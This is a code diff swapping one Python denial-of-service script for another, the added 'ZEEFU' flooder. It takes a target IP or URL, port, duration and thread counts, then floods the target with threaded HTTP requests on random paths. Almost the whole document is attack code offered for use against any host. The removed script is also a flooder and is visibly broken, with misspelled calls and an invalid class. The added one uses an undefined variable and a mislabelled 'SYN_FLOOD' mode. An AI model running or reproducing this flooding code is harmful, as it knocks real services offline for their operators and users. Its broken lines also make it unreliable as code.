@@ -1,111 +1,133 @@
-import socket
-import time
-import os
-import random
-
-from threading import Thread
-
-os.system("clear")
-
-if not __name__ == "__main__":
-    exit()
-      
-class ConsoleColors:
-    def warna():
-    GRAY = \033[2mgray = abu-abu
-    RED = \033[31mred = merah
-    GREEN = \033[32mgreen = hijau
-    UELLOW =\033[33myellow = kuning
-    BLUE =\033[34mblue = biru
-
-peint("""
-\033[96m║\033[102m
-\033[96m║\033[102m║████████╚╗
-\033[96m║\033[102m║██╔═══╗██║
-\033[96m║\033[102m║██║     ║██║
-\033[96m║\033[102m║██║     ║██║
-\033[96m║\033[102m║██║     ║██║
-\033[96m║\033[102m║██║     ║██║
-\033[96m║\033[102m║████████╔╝
-\033[96m║\033[102m║██╔══╗██╚╗
-\033[96m║\033[102m║██║    ╚╗██║
-\033[96m║\033[102m╚══╝      ╚══╝
-\033[96m║\033[102m
-""")
-print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
- ____       ____      _____           
-
-        written by:••••
-               
-      ''')
-    
-def getport():
-    try:
-        p = int(input(ConsoleColors.BOLD +ConsoleColors.OKGREEN + "Port:\r\n"))
-        return p
-    except ValueError:
-        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
-        return 80
-
-host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host:\r\n")
-port = getport()
-speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
-threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))
-
-ip = socket.gethostbyname(host)
-
-bytesToSend = random._urandom(2450)
-
-i = 0;
-
-
-
-class Count:
-    packetCounter = 0 
-
-def goForDosThatThing():
-    try:
-        while True:
-            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            try:
-                dosSocket.connect((ip, port))
-                for i in range(speedPerRun):
-                    try:
-                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
-                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
-                        Count.packetCounter = Count.packetCounter + 1
-                    except socket.error:
-                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
-                    except KeyboardInterrupt:
-                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
-            except socket.error:
-                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
-            except KeyboardInterrupt:
-                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
-            dosSocket.close()
-    except KeyboardInterrupt:
-        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+# CHECK IMPORT
 try:
-        
-    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
-    _   _   _             _      _                                                                 |___/ 
-          ''')
-    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
-    time.sleep(1)
-    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%")
-    time.sleep(1)
-    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%")
-    time.sleep(1)
-    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%")
-    time.sleep(1)
-    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
+    import socket
+    import threading
+    import string
+    import random
+    import time
+    import os
+    import platform
+    import sys
+    from colorama import Fore
+except ModuleNotFoundError as e:
+    print(f"{e} CAN'T IMPORT . . . .")
+    exit()
+
+#DEF & CLASS
+
+def clear_text():
+    if platform.system().upper() == "WINDOWS":
+        os.system('cls')
+    else:
+        os.system('clear')
+
+def status_print(ip,port,thread_id,rps,path_get):
+    time.sleep(2)
+    print(f"{Fore.YELLOW} [ Z E E F U ]{Fore.LIGHTYELLOW_EX}  Attack {Fore.WHITE}Http {Fore.BLUE}TARGET{Fore.WHITE}={url}:{port} {Fore.RESET}")
+    print(f"{Fore.GREEN} [ Z E E F U ]{Fore.LIGHTBLUE_EX}  Attack{Fore.WHITE} {path_get} {Fore.CYAN} SCRAPE{Fore.BLUE}{rps}{Fore.LIGHTCYAN_EX}ID ⟩::..{Fore.RED}{thread_id}{Fore.RESET}")
+def generate_url_path_pyflooder(num):
+    msg = str(string.ascii_letters + string.digits + string.punctuation)
+    data = "".join(random.sample(msg, int(num)))
+    return data
     
-    for i in range(threads):
+def generate_url_path_choice(num):
+    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
+    data = ""
+    for _ in range(int(num)):
+        data += random.choice(letter)
+    return data
+
+# DOS
+def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
+    rps = 0
+    url_path = ''
+    path_get = ['SYN_FLOOD','CHOIS_FLOOD']
+    path_get_loader = random.choice((path_get))
+    if path_get_loader == "SYN_FLOOD":
+        url_path = generate_url_path_pyflooder(5)
+    else:
+        url_path = generate_url_path_choice(5)
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    try:
+        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
+        s.connect((ip,port))
+        for _ in range(booter_sent):
+            s.sendall(packet_data)
+            s.send(packet_data)
+            rps += 2
+    except:
         try:
-            t = Thread(target=goForDosThatThing)
-            t.start()
-        except KeyboardInterrupt:
-            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
-except KeyboardInterrupt:
-    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+            s.shutdown(socket.SHUT_RDWR)
+            s.close()
+        except:
+            pass
+    status_print(url,port,id,rps,path_get_loader)
+
+status_code = False
+id_loader = 0
+def runing_attack(url,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
+    global status_code,id_loader
+    if status_code == True:
+        while time.time() < time_loader:
+            for _ in range(spam_loader):
+                id_loader += 1
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th.start()
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th.start()
+    else:
+        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+
+
+#DATA
+banner = f"""
+{Fore.WHITE}  ╔═══════════{Fore.GREEN}   ╔══════════{Fore.YELLOW}  ╔══════════╗{Fore.LIGHTBLUE_EX} ╔═════════╗{Fore.RED}╔══╗    ╔══╗
+{Fore.RED} ██████████{Fore.WHITE}  ║{Fore.YELLOW}  ██████████{Fore.GREEN}═╝{Fore.WHITE} ██████████{Fore.YELLOW}═╝{Fore.LIGHTMAGENTA_EX} ██████████{Fore.LIGHTBLUE_EX}═╝██{Fore.RED} ║{Fore.LIGHTBLUE_EX}    ██{Fore.RED} ║
+{Fore.RED}        ██{Fore.WHITE}  ║{Fore.YELLOW}   ██{Fore.GREEN} ║{Fore.WHITE}         ██{Fore.YELLOW} ║{Fore.LIGHTMAGENTA_EX}         ██{Fore.LIGHTBLUE_EX} ║        ██{Fore.RED} ║{Fore.LIGHTBLUE_EX}    ██{Fore.RED} ║
+{Fore.RED}      ██{Fore.WHITE}  ║{Fore.YELLOW}     ██{Fore.GREEN} ╚═══════╗{Fore.WHITE} ██{Fore.YELLOW} ╚═══════╗{Fore.LIGHTMAGENTA_EX} ██{Fore.LIGHTBLUE_EX} ╚═══════╗██{Fore.RED} ║{Fore.LIGHTBLUE_EX}    ██{Fore.RED} ║
+{Fore.RED}     ██{Fore.WHITE}  ║{Fore.YELLOW}      █████████{Fore.GREEN}═╝{Fore.WHITE}  █████████{Fore.YELLOW}═╝{Fore.LIGHTMAGENTA_EX}  █████████{Fore.LIGHTBLUE_EX}═╝ ██{Fore.RED} ║{Fore.LIGHTBLUE_EX}    ██{Fore.RED} ║
+{Fore.RED}    ██{Fore.WHITE}  ║{Fore.YELLOW}       ██{Fore.GREEN} ║{Fore.WHITE}         ██{Fore.YELLOW} ║{Fore.LIGHTMAGENTA_EX}         ██{Fore.LIGHTBLUE_EX} ║        ██{Fore.RED} ║{Fore.LIGHTBLUE_EX}    ██{Fore.RED} ║
+{Fore.RED}   ██{Fore.WHITE}  ╚═══════{Fore.YELLOW} ██{Fore.GREEN} ╚════════╗{Fore.WHITE}██{Fore.YELLOW} ╚════════╗{Fore.LIGHTMAGENTA_EX}██{Fore.LIGHTBLUE_EX} ╚═╗      ██{Fore.RED} ╚════{Fore.LIGHTBLUE_EX}██{Fore.RED} ║
+{Fore.RED}  ███████████{Fore.WHITE}═╝{Fore.YELLOW} ██████████{Fore.GREEN}═╝{Fore.WHITE} ██████████{Fore.YELLOW}═╝{Fore.LIGHTMAGENTA_EX} ██{Fore.LIGHTBLUE_EX}═╝         ████████{Fore.RED}══╝
+{Fore.CYAN}     
+{Fore.GREEN}╔═════════════════════════════════════════════════════════════════╗
+{Fore.GREEN}║{Fore.YELLOW}   Design By: Kun/https://github.com/abatatsa99                  {Fore.GREEN}║
+{Fore.GREEN}╚═════════════════════════════════════════════════════════════════╝
+{Fore.GREEN}===>> Z E E F U MEMBUTUHKAN 35 DETIK UNTUK MEMULAI SERANGAN...!! <==={Fore.RESET}"""
+
+print(banner)
+host = ""
+ip = ""
+target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL==⟩⟩ {Fore.WHITE} ")
+port_loader = int(input(f"{Fore.YELLOW}PORT==⟩⟩ {Fore.YELLOW} "))
+time_loader = time.time() + int(input(f"{Fore.GREEN}TIME (DEFAULT=200)==⟩⟩ {Fore.WHITE} "))
+spam_loader = int(input(f"{Fore.BLUE}SPAM THREAD (DEFAULT=50 OR 250)==⟩⟩ {Fore.YELLOW} "))
+create_thread = int(input(F"{Fore.WHITE}CREATE THREAD (DEFAULT=)==⟩⟩ {Fore.WHITE}"))
+booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)==⟩⟩ {Fore.WHITE} "))
+print(f"{Fore.YELLOW} EXAMPLE HTTP METHODS> CONNECT GET POST HEAD ")
+print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> CLOUDFLARE AGE PYFLOODER GATEWAY")
+methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
+print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
+try:
+    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
+    ip = socket.gethostbyname(host)
+except socket.gaierror:
+    exit()
+for loader_num in range(create_thread):
+    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
+    sys.stdout.flush()
+    threading.Thread(target=runing_attack,args=(url,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(url,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(url,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(url,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+    threading.Thread(target=runing_attack,args=(url,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
+clear_text()
+print(banner)
+status_code = True
+print(f"{Fore.GREEN}MULAI MENYERANG . . .{Fore.RESET}")
